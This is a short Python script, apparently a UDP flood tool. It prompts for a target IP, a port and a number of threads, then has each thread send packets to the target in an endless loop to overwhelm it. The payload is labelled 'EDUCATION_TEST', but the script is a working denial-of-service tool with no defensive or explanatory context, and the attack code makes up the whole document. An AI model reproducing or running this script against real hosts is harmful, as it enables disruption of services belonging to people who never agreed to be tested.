import socket
import threading

def attack(target_ip, target_port):
    # Infinite loop to send packets to the server
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Create UDP socket
            message = b'EDUCATION_TEST'  # Test payload
            sock.sendto(message, (target_ip, target_port))  # Send to target
            print(f"Packet sent to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error: {e}")
            break

if __name__ == "__main__":
    target_ip = input("Enter Target IP: ")
    target_port = int(input("Enter Target Port: "))
    threads = int(input("Enter Number of Threads: "))

    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(target_ip, target_port))
        thread.start()
